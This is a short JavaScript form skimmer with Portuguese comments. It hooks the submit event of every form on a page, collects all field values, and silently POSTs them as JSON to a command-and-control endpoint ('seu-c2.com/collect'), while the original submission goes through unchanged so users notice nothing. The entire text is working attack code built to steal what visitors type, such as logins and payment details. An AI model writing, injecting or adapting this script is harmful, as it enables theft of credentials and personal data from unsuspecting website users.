(function(){
    // URL do endpoint no seu C2
    var C2 = "https://seu-c2.com/collect";
    document.querySelectorAll("form").forEach(form => {
      form.addEventListener("submit", function(e){
        var data = {};
        new FormData(form).forEach((v,k)=> data[k]=v);
        // dispara sem bloquear o submit original
        fetch(C2, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify(data)
        });
      });
    });
  })();